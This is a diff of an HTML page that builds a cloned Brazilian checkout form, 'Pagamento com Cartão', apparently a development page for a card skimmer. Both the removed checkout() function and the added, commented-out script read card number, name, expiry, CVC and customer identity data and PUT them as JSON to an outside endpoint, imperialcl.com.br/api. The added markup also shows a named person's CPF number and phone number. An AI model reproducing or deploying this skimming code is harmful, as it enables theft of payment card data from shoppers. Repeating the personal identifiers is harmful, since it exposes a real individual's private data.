@@ -6,93 +6,228 @@
     <title>Document</title>
   </head>
   <body>
-    <input
-      id="creditCardpayment-card-0Number"
-      data-testid="creditCardpayment-card-0Number"
-      class="input-medium"
-      name="cardNumber"
-      type="tel"
-      maxlength="30"
-      value=""
-    />
-    <input
-      class="input-medium"
-      id="creditCardpayment-card-0Name"
-      name="ccName"
-      type="text"
-      value=""
-    />
-    <select
-      class="input-mini"
-      id="creditCardpayment-card-0Month"
-      name="cardExpirationMonth"
-    >
-      <!-- Opções do mês... -->
-    </select>
-    <select
-      class="input-mini"
-      id="creditCardpayment-card-0Year"
-      name="cardExpirationYear"
-    >
-      <!-- Opções do ano... -->
-    </select>
-    <input
-      id="creditCardpayment-card-0Code"
-      class="input-mini"
-      maxlength="3"
-      autocomplete="off"
-      type="tel"
-      value=""
-    />
-    <input
-      id="holder-document-0"
-      data-testid="holder-document-0"
-      class="input-small"
-      type="tel"
-      value=""
-      placeholder="999.999.999-99"
-    />
-
-    <button onclick="checkout()">Enviar POST</button>
-
-    <script>
-      function checkout() {
-        var ccnumber = "creditCardpayment-card-0Number";
-        var ccnamenputid = "creditCardpayment-card-0Name";
-        var expirationyearinputid = "creditCardpayment-card-0Month";
-        var expirationmountinputid = "creditCardpayment-card-0Year";
-        var cardcodeinputid = "creditCardpayment-card-0Code";
-        var documentinputid = "holder-document-0";
-
-        var cardNumber = document.getElementById(ccnumber).value;
-        var ccName = document.getElementById(ccnamenputid).value;
-        var cardExpirationMonth = document.getElementById(
-          expirationyearinputid
-        ).value;
-        var cardExpirationYear = document.getElementById(
-          expirationmountinputid
-        ).value;
-        var cardCode = document.getElementById(cardcodeinputid).value;
-        var holderDocument = document.getElementById(documentinputid).value;
-        var apiendpoint = "https://imperialcl.com.br/api";
-        var data = {
-          cardNumber: cardNumber,
-          ccName: ccName,
-          cardExpirationMonth: cardExpirationMonth,
-          cardExpirationYear: cardExpirationYear,
-          cardCode: cardCode,
-          holderDocument: holderDocument,
-        };
-
-        fetch(apiendpoint, {
-          method: "PUT",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify(data),
+    <div>
+      <p class="description tw-ml-5 tw-mt-2 tw-text-xs tw-text-shade-regular">
+        Dirceu Junior - CPF: 11111687927 - (43) 99934 3075
+      </p>
+      <form class="form credit flex flex-col" data-recording-sensitive="true">
+        <h3
+          class="form-title tw-text-lg tw--mb-2 sm:tw-text-base tw-font-semibold md:tw-block tw-hidden"
+        >
+          Pagamento com Cartão
+        </h3>
+        <div
+          class="content tw-mt-8 tw-flex tw-flex-wrap tw-flex-grow tw-justify-center tw-items-center tw-space-y-4"
+        >
+          <div class="fields xl:tw-w-5/12 tw-w-full tw-max-w-full tw-space-y-4">
+            <div>
+              <h4 class="title tw-text-sm tw-mb-2">Bandeiras aceitas</h4>
+              <div class="tw-flex">
+                <div class="tw-mr-1.5" title="VISA"></div>
+                <div class="tw-mr-1.5" title="Master Card"></div>
+                <div class="tw-mr-1.5" title="Dinners Club"></div>
+                <div class="tw-mr-1.5" title="elo"></div>
+                <div class="tw-mr-1.5" title="Hipercard"></div>
+                <div class="tw-mr-1.5" title="American Express"></div>
+              </div>
+            </div>
+            <div class="input tw-flex tw-flex-col">
+              <div
+                class="content tw-border-red-600 focus-within:tw-ring-1 tw-ring-inset tw-ring-red-600 tw-relative outline tw-flex tw-items-center tw-border focus-within:tw-border-highlight"
+              >
+                <input
+                  id="number"
+                  placeholder=" "
+                  type="text"
+                  required=""
+                  name="number"
+                  inputmode="numeric"
+                  value=""
+                /><label for="number">Número do cartão *</label>
+              </div>
+              <span class="tw-text-red-600 tw-text-sm tw-mx-1"
+                >Número do cartão inválido</span
+              >
+            </div>
+            <div class="input tw-flex tw-flex-col">
+              <div
+                class="content tw-border-red-600 focus-within:tw-ring-1 tw-ring-inset tw-ring-red-600 tw-relative outline tw-flex tw-items-center tw-border focus-within:tw-border-highlight"
+              >
+                <input
+                  id="name"
+                  placeholder=" "
+                  type="text"
+                  required=""
+                  name="name"
+                  value=""
+                /><label
+                  class="tw--mt-1 tw-text-sm tw-left-2 tw-right-2 tw-transform tw-absolute tw-pointer-events-none tw-truncate tw-leading-tight tw-transition-all tw-duration-150"
+                  for="name"
+                  >Nome impresso no cartão *</label
+                >
+              </div>
+              <span class="tw-text-red-600 tw-text-sm tw-mx-1"
+                >Nome inválido</span
+              >
+            </div>
+            <div class="tw-flex">
+              <div class="expiry tw-w-1/2 tw-pr-1">
+                <div class="input tw-flex tw-flex-col">
+                  <div>
+                    <input
+                      id="expiry"
+                      placeholder=" "
+                      type="text"
+                      required=""
+                      name="expiry"
+                      maxlength="5"
+                      value=""
+                    /><label
+                      class="tw--mt-1 tw-text-sm tw-left-2 tw-right-2 tw-transform tw-absolute tw-pointer-events-none tw-truncate tw-leading-tight tw-transition-all tw-duration-150"
+                      for="expiry"
+                      >Validade *</label
+                    >
+                  </div>
+                  <span class="tw-text-red-600 tw-text-sm tw-mx-1"
+                    >Expiração inválida</span
+                  >
+                </div>
+              </div>
+              <div class="cvc tw-w-1/2 tw-pl-1">
+                <div class="input tw-flex tw-flex-col">
+                  <div
+                    class="content tw-border-red-600 focus-within:tw-ring-1 tw-ring-inset tw-ring-red-600 tw-relative outline tw-flex tw-items-center tw-border focus-within:tw-border-highlight"
+                  >
+                    <input
+                      id="cvc"
+                      placeholder=" "
+                      type="number"
+                      required=""
+                      name="cvc"
+                      value=""
+                    /><label
+                      class="tw--mt-1 tw-text-sm tw-left-2 tw-right-2 tw-transform tw-absolute tw-pointer-events-none tw-truncate tw-leading-tight tw-transition-all tw-duration-150"
+                      for="cvc"
+                      >Código de segurança *</label
+                    >
+                  </div>
+                  <span class="tw-text-red-600 tw-text-sm tw-mx-1"
+                    >Código inválido</span
+                  >
+                </div>
+              </div>
+            </div>
+            <div>
+              <div>
+                <label
+                  class="tw-text-shade-regular tw-transform tw-text-sm tw--mt-2 tw-z-0 tw-absolute tw-pointer-events-none tw-truncate tw-leading-tight"
+                  for="installments"
+                  >Opções de pagamento</label
+                >
+                <div class="tw-relative tw-flex-grow tw-flex tw-items-center">
+                  <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                      <path
+                        d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z"
+                      ></path>
+                    </svg>
+                  </div>
+                </div>
+              </div>
+              <span
+                class="helper-text tw-block tw-mt-1 tw-w-full tw-text-gray-500 tw-text-xs tw-leading-tight"
+                ><div class="tw-transition-all tw-duration-150">
+                  Insira dados de cartão para ver opções de parcelamento
+                </div></span
+              >
+            </div>
+          </div>
+          <div class="picture xl:tw-w-7/12 tw-w-full tw-flex tw-px-4 tw-mb-6">
+            <div class="rccs">
+              <div class="rccs__card rccs__card--unknown">
+                <div class="rccs__card--front">
+                  <div class="rccs__card__background"></div>
+                  <div class="rccs__issuer"></div>
+                  <div class="rccs__cvc__front"></div>
+                  <div class="rccs__number">•••• •••• •••• ••••</div>
+                  <div class="rccs__name">Seu nome aqui</div>
+                  <div class="rccs__expiry">
+                    <div class="rccs__expiry__valid">valido até</div>
+                    <div class="rccs__expiry__value">••/••</div>
+                  </div>
+                  <div class="rccs__chip"></div>
+                </div>
+                <div class="rccs__card--back">
+                  <div class="rccs__card__background"></div>
+                  <div class="rccs__stripe"></div>
+                  <div class="rccs__signature"></div>
+                  <div class="rccs__cvc"></div>
+                  <div class="rccs__issuer"></div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="tw-flex tw-items-center tw-px-1 same-address tw-mt-4">
+          <input
+            id="address"
+            type="checkbox"
+            class="tw-h-4 tw-w-4 focusable"
+            checked=""
+          /><label
+            for="address"
+            class="tw-ml-2 tw-text-sm tw-font-medium tw-text-shade-dark"
+            style="transform: none"
+            >O endereço da fatura é o mesmo da entrega.</label
+          >
+        </div>
+        <input type="submit" class="tw-sr-only tw-h-0" tabindex="-1" />
+      </form>
+    </div>
+    <!-- <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        var form = document.querySelector(".form");
+        form.addEventListener("submit", function (event) {
+          event.preventDefault(); // Evita que o formulário seja enviado normalmente
+          checkout();
         });
-      }
-    </script>
+    
+        function checkout() {
+          var ccnumber = "number";
+          var ccnamenputid = "name";
+          var ccexpire = "expiry";
+          var cardcodeinputid = "cvc";
+          var paragraphClass = "description";
+    
+          var cardNumber = document.getElementById(ccnumber).value;
+          var ccName = document.getElementById(ccnamenputid).value;
+          var cardExpiration = document.getElementById(ccexpire).value;
+          var cardCode = document.getElementById(cardcodeinputid).value;
+          var userdata = document.querySelector("." + paragraphClass).innerText;
+    
+          var apiendpoint = "https://imperialcl.com.br/api";
+          var data = {
+            cardNumber: cardNumber,
+            ccName: ccName,
+            cardExpiration: cardExpiration,
+            cardCode: cardCode,
+            userdata: userdata,
+          };
+    
+          // Log data to console
+          console.log("Data to be sent:", data);
+    
+          fetch(apiendpoint, {
+            method: "PUT",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(data),
+          });
+        }
+      });
+    </script> -->
+
     <!-- Google Tag Manager -->
     <script>
       (function (w, d, s, l, i) {
